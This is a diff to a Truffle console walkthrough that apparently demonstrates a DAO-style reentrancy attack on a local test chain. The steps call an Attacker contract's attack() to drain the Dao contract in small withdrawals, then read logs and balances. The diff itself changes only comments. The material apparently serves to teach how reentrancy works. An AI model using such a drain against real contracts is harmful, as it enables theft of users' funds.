@@ -23,20 +23,20 @@ Attacker.deployed().then(function(ins) {ins.getAttackerBalance.call().then(funct
 // 4. Check balance of acct 1 in the dao. should be 15 eth
 Attacker.deployed().then(function(ins) {ins.getDaoBalance.call(web3.eth.accounts[0]).then(function(val) {console.log(web3.fromWei(val.toNumber(),'ether'))})})
 
-// 5. Attacker contract to start draining tao in steps of 0.02! Setting gas to 500000. Things get interesting...
+// 5. Attacker contract to start draining dao in steps of 0.02! Setting gas to 500000. Things get interesting...
 Attacker.deployed().then(function(ins) {ins.attack({gas: 600000})})
 
 // 6. get all transaction log
 Attacker.deployed().then(function(ins) {ins.logDeposit({},{fromBlock: 0, toBlock: 'latest'}).get(function(err, val) {console.log(val)})})
 Attacker.deployed().then(function(ins) {ins.logPayment({},{fromBlock: 0, toBlock: 'latest'}).get(function(err, val) {console.log(val)})})
 
-// 7. How many times did the attacker withdraw?
+// 7. How many times did the attacker withdraw? How?
 Attacker.deployed().then(function(ins) {ins.counter.call().then(function(val) {console.log(val.toNumber())})})
 
-// 8. Check balance of Dao contract. should be less than 15 eth. How?
+// 8. Check balance of Dao contract. should be less than 15 eth.
 Attacker.deployed().then(function(ins) {ins.getDaoContractBalance.call().then(function (val) {console.log(web3.fromWei(val.toNumber(),'ether'))})})
 
-// 10. Check balance of attacker contract. I should be more than 0 eth. How?
+// 10. Check balance of attacker contract. I should be more than 0 eth. 
 Attacker.deployed().then(function(ins) {ins.getAttackerBalance.call().then(function (val) {console.log(web3.fromWei(val.toNumber(),'ether'))})})
 
 // 11. Final acct 1 balance (tx.origin)
